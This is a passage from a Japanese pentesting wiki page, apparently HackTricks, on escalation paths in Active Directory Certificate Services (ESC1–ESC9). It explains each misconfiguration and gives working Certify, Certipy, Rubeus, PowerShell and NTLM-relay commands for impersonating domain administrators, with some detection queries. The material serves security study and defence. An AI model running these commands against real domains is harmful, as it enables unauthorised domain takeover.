# AD CS ドメインエスカレーション

{{#include ../../../banners/hacktricks-training.md}}


**これは、以下の投稿におけるエスカレーション technique セクションの概要です:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 設定ミスのある Certificate Templates - ESC1

### 説明

### 設定ミスのある Certificate Templates - ESC1 の説明

- **Enterprise CA によって、低権限ユーザーに Enrolment 権限が付与されている。**
- **Manager の承認が必要ない。**
- **承認権限を持つ担当者からの署名が必要ない。**
- **Certificate Templates の Security descriptor が過度に許容的であり、低権限ユーザーが Enrolment 権限を取得できる。**
- **Certificate Templates が、認証を容易にする EKU を定義するよう設定されている:**
- Client Authentication（OID 1.3.6.1.5.5.7.3.2）、PKINIT Client Authentication（1.3.6.1.5.2.3.4）、Smart Card Logon（OID 1.3.6.1.4.1.311.20.2.2）、Any Purpose（OID 2.5.29.37.0）、または EKU なし（SubCA）などの Extended Key Usage（EKU）識別子が含まれている。
- **Certificate Signing Request（CSR）に subjectAltName を含めることがリクエスターに許可されている:**
- Active Directory（AD）は、証明書に subjectAltName（SAN）が存在する場合、本人確認においてこれを優先する。つまり、CSR で SAN を指定することで、任意のユーザー（ドメイン管理者など）になりすます証明書を要求できる。リクエスターが SAN を指定できるかどうかは、Certificate Template の AD オブジェクトにある `mspki-certificate-name-flag` プロパティで示される。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが存在すると、リクエスターによる SAN の指定が許可される。

> [!CAUTION]
> この設定により、低権限ユーザーは任意の SAN を持つ証明書を要求でき、Kerberos または SChannel を介して任意のドメインプリンシパルとして認証できる。

この機能は、製品や deployment service による HTTPS または host certificate のオンザフライ生成をサポートするため、あるいは理解不足によって有効化されることがある。

このオプションを使用して証明書を作成すると警告が表示されるが、既存の Certificate Template（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効な `WebServer` template など）を複製し、authentication OID を含めるよう変更した場合には警告が表示されないことが指摘されている。<sup>[[6]](#references)</sup>

### 悪用

**脆弱な Certificate Templates を見つける**には、次を実行できます:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者になりすますには、次を実行します。**
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成された**certificate を `.pfx`**形式に変換し、再び**Rubeus または certipy を使用して authenticate**できます：<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows バイナリの「Certreq.exe」および「Certutil.exe」を使用して PFX を生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の構成スキーマ内にある証明書テンプレートのうち、承認や署名を必要とせず、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効になっているものは、次の LDAP クエリを実行して列挙できます。
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

2つ目のabuse scenarioは、1つ目のバリエーションです。

1. Enterprise CAによって、低権限ユーザーにEnrollment rightsが付与されている。
2. manager approvalの要件が無効化されている。
3. authorized signaturesの必要性が省略されている。
4. certificate templateの過度に許容的なsecurity descriptorにより、低権限ユーザーにcertificate enrollment rightsが付与されている。
5. **certificate templateにAny Purpose EKUまたはEKUなしが含まれるよう定義されている。**

**Any Purpose EKU**により、攻撃者はclient authentication、server authentication、code signingなど、**あらゆる目的**で使用できるcertificateを取得できます。このシナリオの悪用には、**ESC3で使用されるtechnique**と同じものを利用できます。

**EKUがない**certificateは、subordinate CA certificatesとして機能し、**あらゆる目的**で悪用できるほか、**新しいcertificateへの署名にも使用できます**。そのため、攻撃者はsubordinate CA certificateを利用して、新しいcertificateに任意のEKUやフィールドを指定できます。

ただし、subordinate CAが**`NTAuthCertificates`** objectによって信頼されていない場合（デフォルト設定）、**domain authentication**用に作成された新しいcertificateは機能しません。それでも攻撃者は、任意のEKUと任意のcertificate valuesを持つ**新しいcertificateを作成できます**。これらは、code signing、server authenticationなど、幅広い目的で**悪用される可能性**があり、SAML、AD FS、IPSecなど、network内の他のapplicationにも重大な影響を及ぼす可能性があります。<sup>[[6]](#references)</sup>

AD Forestのconfiguration schema内でこのシナリオに該当するtemplatesを列挙するには、次のLDAP queryを実行します。
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 設定ミスのある Enrolment Agent Templates - ESC3

### 説明

このシナリオは 1 番目および 2 番目のシナリオに似ていますが、**異なる EKU**（Certificate Request Agent）と **2 つの異なるテンプレート**（そのため要件も 2 セット）を**悪用**します。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれ、プリンシパルが**別のユーザーに代わって** **証明書**を**enroll**できるようにします。

**「enrollment agent」**はそのような**テンプレート**に**enroll**し、取得した**証明書を使用して、他のユーザーに代わって CSR に共同署名します**。その後、**共同署名された CSR**を CA に**送信**し、**「enroll on behalf of」**を許可する**テンプレート**に**enroll**します。すると CA は**「他の」ユーザーに属する証明書**を返します。<sup>[[6]](#references)</sup>

**要件 1:**

- Enterprise CA により、低権限ユーザーに enrollment 権限が付与されている。
- manager approval の要件が省略されている。
- authorized signatures の要件がない。
- 証明書テンプレートの security descriptor が過度に寛容で、低権限ユーザーに enrollment 権限を付与している。
- 証明書テンプレートに Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって他の証明書テンプレートを要求できる。

**要件 2:**

- Enterprise CA が低権限ユーザーに enrollment 権限を付与している。
- manager approval が bypass されている。
- テンプレートの schema version が 1 または 2 より大きく、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement が指定されている。
- 証明書テンプレートで定義された EKU により、domain authentication が許可されている。
- CA で enrollment agents に対する制限が適用されていない。

### Abuse

[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用して、このシナリオを**悪用**できます。<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate**を**取得**できる**users**、enrollment **agents**がenrollを許可されるテンプレート、およびenrollment agentが代理として行動できる**accounts**は、enterprise CAによって制限できます。これは、`certsrc.msc` **snap-in**を開き、**CAを右クリック**して**Properties**をクリックし、「Enrollment Agents」タブに**移動**することで設定できます。

ただし、CAの**default**設定は「**Do not restrict enrollment agents**」であることに注意が必要です。管理者がenrollment agentsの制限を有効にし、「Restrict enrollment agents」に設定した場合でも、default configurationは依然として非常に寛容です。これにより、**Everyone**がすべてのテンプレートへのenrollを、誰としてでも実行できます。

### Windows-only PowerShell PoCs with Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai)は、CertifyやCertipyを使わずにESC1およびESC2/ESC3を実行します。そのscriptsは、`X509Enrollment` COM APIを使用してexportableな2048-bit RSA keyを作成し、PKCS#10 requestを構築し、LDAPを通じて最初の`pKIEnrollmentService`を検出し、`CertificateAuthority.Request`を通じて送信し、responseを`Cert:\CurrentUser\My`にinstallして、Base64-encoded PFXをexportします。ESC1 scriptはattackerが選択したUPN SAN（`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`、value `0xb`）を追加します。一方、ESC2/ESC3 scriptsは、最初のcertificateを使用してon-behalf-of requestに署名するPKCS#7を作成します。<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
スクリプトは、Rubeusで直接使用するための、秘密鍵を含む **PFX** のBase64を出力します。`RawData` は公開証明書のみをエンコードし、PKINITリクエストに署名できないため、`[Convert]::ToBase64String($cert.RawData)` に置き換えないでください。<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## 脆弱な Certificate Template のアクセス制御 - ESC4

### **説明**

**certificate templates** の **security descriptor** は、**AD principal** がテンプレートに対して持つ固有の **permissions** を定義します。

**attacker** が **template** を **変更** し、**前のセクション**で説明した **exploit可能な misconfiguration** を導入するために必要な **permissions** を持っている場合、privilege escalation が可能になります。

certificate templates に適用される主な permissions は次のとおりです。<sup>[[6]](#references)</sup>

- **Owner:** オブジェクトに対する暗黙的な control を付与し、あらゆる attributes の変更を可能にします。
- **FullControl:** あらゆる attributes の変更を含む、オブジェクトに対する完全な権限を付与します。
- **WriteOwner:** オブジェクトの owner を、attacker が control する principal に変更できます。
- **WriteDacl:** access controls の調整を可能にし、attacker に FullControl を付与できる可能性があります。
- **WriteProperty:** オブジェクトの任意の properties を編集できます。

### Abuse

templates やその他の PKI objects に対する編集権限を持つ principals を特定するには、Certify で enumerate します。
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
前のものと同様の privesc の例です。

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 は、ユーザーが certificate template に対する write privileges を持っている場合です。たとえば、certificate template の設定を上書きして、template を ESC1 に対して脆弱にすることで悪用できます。

上記のパスからわかるように、これらの権限を持っているのは `JOHNPC` だけですが、ユーザー `JOHN` には `JOHNPC` への新しい `AddKeyCredentialLink` edge があります。この technique は certificates に関連するため、この攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) として知られています。<sup>[[8]](#references)</sup> 以下は、被害者の NT hash を取得する Certipy の `shadow auto` command の簡単なプレビューです。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は、1つのコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipy は設定を**ESC1 に対して脆弱な状態**になるように**上書き**します。また、**`-save-old` パラメーターを指定して以前の設定を保存**することもできます。これは、攻撃後に設定を**復元**する際に役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

証明書テンプレートや certificate authority 以外の複数のオブジェクトを含む、相互に関連した ACL ベースの関係の広範なネットワークは、AD CS システム全体の security に影響を及ぼす可能性があります。security に大きな影響を与えるこれらのオブジェクトには、次のものが含まれます。

- S4U2Self や S4U2Proxy などの mechanism によって compromise される可能性がある、CA server の AD computer object。
- CA server の RPC/DCOM server。
- 特定の container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、任意の descendant AD object または container。この path には、Certificate Templates container、Certification Authorities container、NTAuthCertificates object、Enrollment Services Container などの container や object が含まれますが、これらに限定されません。

low-privileged attacker がこれらの重要な component のいずれかを control できると、PKI system の security が compromise される可能性があります。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) で説明されている内容では、Microsoft が概説している **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の implications についても触れています。この configuration を Certification Authority (CA) で有効にすると、Active Directory® から作成された request を含む **任意の request** に、**user-defined values** を **subject alternative name** に含めることができます。その結果、この機能によって、domain **authentication** 用に設定された **任意の template**、特に標準の User template のように **unprivileged** user による enrollment が許可されている template を通じて、**intruder** が enrollment できるようになります。これにより、intruder は domain administrator または domain 内の **その他の有効な entity** として authentication できる certificate を取得できます。<sup>[[9]](#references)</sup>

**Note**: `certreq.exe` の `-attrib "SAN:"` argument（“Name Value Pairs” と呼ばれます）を使用して Certificate Signing Request (CSR) に **alternative names** を追加する方法は、ESC1 における SAN の exploitation strategy とは異なります。ここでの違いは、account information の encapsulation 方法にあります。つまり、extension 内ではなく certificate attribute 内に格納されます。

### Abuse

setting が有効になっているか確認するには、organizations は `certutil.exe` で次の command を使用できます。
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作では本質的に **remote registry access** が使用されるため、別のアプローチとして次の方法が考えられます：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify)や[**Certipy**](https://github.com/ly4k/Certipy)などのツールは、この設定ミスを検出して悪用できます:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**domain administrative** 権限または同等の権限を持っている場合、任意のワークステーションから以下のコマンドを実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
環境でこの設定を無効にするには、次の方法でフラグを削除できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のセキュリティ更新プログラム以降、新しく発行される**証明書**には、**要求者の `objectSid` プロパティ**を組み込んだ**セキュリティ拡張**が含まれます。ESC1では、このSIDは指定されたSANから導出されます。ただし、**ESC6**では、SIDはSANではなく**要求者の `objectSid`**を反映します。\
> ESC6を悪用するには、**SANを新しいセキュリティ拡張より優先する**ESC10（Weak Certificate Mappings）に対してシステムが脆弱であることが不可欠です。

## 脆弱な Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate AuthorityのAccess controlは、CAのアクションを制御する一連の権限によって維持されています。これらの権限は、`certsrv.msc`にアクセスし、CAを右クリックしてプロパティを選択し、Securityタブに移動することで確認できます。さらに、PSPKI moduleを使用し、次のようなコマンドで権限を列挙できます：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは、主要な権限である **`ManageCA`** と **`ManageCertificates`** に関する洞察を提供します。これらはそれぞれ「CA administrator」と「Certificate Manager」のロールに対応します。<sup>[[6]](#references)</sup>

#### Abuse

Certificate authority に対する **`ManageCA`** 権限を持つ principal は、PSPKI を使用してリモートから設定を操作できます。これには、任意の template で SAN の指定を許可する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグの切り替えが含まれ、これは domain escalation における重要な要素です。

このプロセスは、PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡略化できます。これにより、GUI を直接操作せずに変更できます。

**`ManageCertificates`** 権限を持つことで、保留中のリクエストを承認でき、「CA certificate manager approval」という safeguard を事実上回避できます。

**Certify** と **PSPKI** modules を組み合わせることで、certificate のリクエスト、承認、ダウンロードを実行できます：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> **前回の攻撃**では、**`Manage CA`** permissions を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** flag を **enable** し、**ESC6 attack** を実行しましたが、CA service（`CertSvc`）が再起動されるまで効果はありません。ユーザーが **`Manage CA`** access right を持っている場合、そのユーザーには **service を再起動する**権限も与えられます。ただし、これは**ユーザーが service をリモートから再起動できる**ことを意味しません。さらに、2022 年 5 月の security updates により、ほとんどの patched environments では、E**SC6 はそのままでは機能しない可能性があります**。

そのため、ここでは別の攻撃を紹介します。

前提条件:

- **`ManageCA` permission** のみ
- **`Manage Certificates`** permission（**`ManageCA`** から付与可能）
- **`SubCA`** certificate template が **enabled** であること（**`ManageCA`** から enable 可能）

この technique は、`Manage CA` _and_ `Manage Certificates` access right を持つユーザーが、**失敗した certificate requests を発行できる**という事実に依存します。**`SubCA`** certificate template は **ESC1** に対して **vulnerable** ですが、template に enroll できるのは**管理者のみ**です。したがって、**user** は **`SubCA`** への enroll を **request** できます。この request は **denied** されますが、**その後 manager によって発行されます**。<sup>[[6]](#references)</sup>

#### Abuse

自分の user を新しい officer として追加することで、**`Manage Certificates`** access right を**自分自身に付与**できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template は、`-enable-template` パラメーターを使用して **CA** で有効化できます。デフォルトでは、`SubCA` template は有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしている場合、まず **`SubCA` template に基づく証明書を要求**します。

**この要求は拒否されま**すが、private key を保存し、request ID を記録します。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` と **`Manage Certificates`** を使用すると、`ca` コマンドと `-issue-request <request ID>` パラメーターで、失敗した証明書要求を**発行**できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req` コマンドと `-retrieve <request ID>` パラメーターを使用して、**発行された certificate を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

従来の ESC7 abuse（EDITF 属性の有効化や保留中のリクエストの承認）に加えて、**Certify 2.0** により、Enterprise CA 上の *Manage Certificates*（別名 **Certificate Manager / Officer**）role のみを必要とする、まったく新しい primitive が明らかになりました。<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method は、*Manage Certificates* を保持する任意の principal が実行できます。この method は従来、正規の CA が**保留中**のリクエストの extension を更新するために使用していました。しかし attacker はこれを abuse し、承認待ちのリクエストに**デフォルトではない certificate extension**（例: `1.1.1.1` などの custom *Certificate Issuance Policy* OID）を**追加**できます。

対象の template がその extension のデフォルト値を**定義していない**場合、リクエストが最終的に発行される際に CA は attacker が制御する値を上書きしません。そのため、生成された certificate には attacker が選択した extension が含まれ、次のような用途に利用できます。

* 他の vulnerable な template の Application / Issuance Policy 要件を満たす（privilege escalation につながる）。
* third-party system で certificate に予期しない trust を与える追加の EKU や policy を注入する。

要するに、従来 ESC7 の「より低権限な」側と考えられていた *Manage Certificates* は、CA configuration を変更したり、より制限の厳しい *Manage CA* right を必要としたりせずに、完全な privilege escalation や長期的な persistence に利用できるようになりました。

#### Certify 2.0 で primitive を abuse する

1. **保留中のままになる certificate request を送信する。** manager approval を要求する template を使用すると、これを強制できます。
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 新しい `manage-ca` command を使用して、保留中のリクエストに custom extension を**追加**する。
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*template がすでに *Certificate Issuance Policies* extension を定義していない場合、上記の値は発行後も保持されます。*

3. （自身の role に *Manage Certificates* approval rights もある場合）リクエストを**発行**するか、operator が承認するのを待つ。発行されたら certificate を download する。
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成された certificate には悪意のある issuance-policy OID が含まれるため、その後の attack（例: ESC13、domain escalation など）で使用できます。

> NOTE: 同じ attack は `ca` command と `-set-extension` parameter を使用して、Certipy ≥ 4.7 でも実行できます。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> **AD CS が install されている**環境で、**vulnerable な web enrollment endpoint が存在**し、さらに**domain computer enrollment と client authentication を許可する certificate template**（デフォルトの **`Machine`** template など）が少なくとも 1 つ publish されている場合、**spooler service が active な任意の computer が attacker に compromise される可能性があります**！

AD CS は複数の **HTTP-based enrollment method** をサポートしており、これらは administrator が install できる追加の server role によって提供されます。HTTP-based certificate enrollment 用のこれらの interface は、**NTLM relay attack** に vulnerable です。attacker は、**compromised machine から、inbound NTLM で authenticate する任意の AD account を impersonate できます**。victim account を impersonate している間、attacker はこれらの web interface に access し、`User` または `Machine` certificate template を使用して client authentication certificate を**request**できます。

- **web enrollment interface**（`http://<caserver>/certsrv/` で利用できる古い ASP application）は、デフォルトで HTTP のみを使用するため、NTLM relay attack に対する protection がありません。さらに、Authorization HTTP header を通じた NTLM authentication のみを明示的に許可しているため、Kerberos などのより secure な authentication method は使用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、および **Network Device Enrollment Service**（NDES）は、デフォルトで Authorization HTTP header を介した negotiate authentication をサポートします。Negotiate authentication は Kerberos と **NTLM** の両方をサポートするため、attacker は relay attack 中に authentication を **NTLM に downgrade**できます。これらの web service はデフォルトで HTTPS を有効にしていますが、HTTPS だけでは NTLM relay attack から保護できません。HTTPS service を NTLM relay attack から保護するには、HTTPS と channel binding の組み合わせが必要です。しかし残念ながら、AD CS は IIS で Extended Protection for Authentication を有効にしていません。これは channel binding に必要です。<sup>[[6]](#references)</sup>

NTLM relay attack における一般的な**問題**は、NTLM session の**有効期間が短い**ことと、**NTLM signing を要求する**service と attacker が interact できないことです。

それでも、relay attack を利用して user の certificate を取得することで、この制限を克服できます。certificate の有効期間が session の期間を決定し、さらに certificate は**NTLM signing を要求する**service でも使用できるためです。盗んだ certificate の使用方法については、以下を参照してください。


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack のもう 1 つの制限は、**attacker が control する machine が victim account によって authenticate される必要がある**ことです。attacker は待機するか、この authentication を**force**しようとすることができます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**enabled な HTTP AD CS endpoint** を enumerate します。<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ Certificate Authority（CA）が Certificate Enrollment Service（CES）のエンドポイントを保存するために使用します。これらのエンドポイントは、**Certutil.exe** ツールを使用して解析および一覧表示できます。
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify を使用した悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)を使用したAbuse

Certificateのrequestは、デフォルトでCertipyによって`Machine`または`User` templateに基づいて実行されます。これは、relayされるaccount nameが`$`で終わるかどうかによって決定されます。別のtemplateを指定するには、`-template` parameterを使用します。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のようなtechniqueを使用してauthenticationを強制できます。domain controllerを扱う場合は、`-template DomainController`の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

**`msPKI-Enrollment-Flag`** における新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）は、ESC9 と呼ばれ、証明書への **新しい `szOID_NTDS_CA_SECURITY_EXT` security extension** の埋め込みを防止します。このフラグは、`StrongCertificateBindingEnforcement` が `1`（デフォルト設定）に設定されている場合に関係します。これは、値が `2` に設定されている場合とは異なります。ESC9 が存在しない場合は要件が変わらないため、Kerberos または Schannel に対するより弱い certificate mapping が悪用される可能性があるシナリオ（ESC10 など）では、このフラグの重要性が高まります。<sup>[[7]](#references)</sup>

このフラグの設定が重要になる条件は、次のとおりです。

- `StrongCertificateBindingEnforcement` が `2` に変更されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
- 証明書の `msPKI-Enrollment-Flag` 設定で、`CT_FLAG_NO_SECURITY_EXTENSION` フラグが指定されている。
- 証明書に任意の client authentication EKU が指定されている。
- 別のアカウントを compromise するために、いずれかのアカウントに対する `GenericWrite` permissions が利用可能である。

### Abuse Scenario

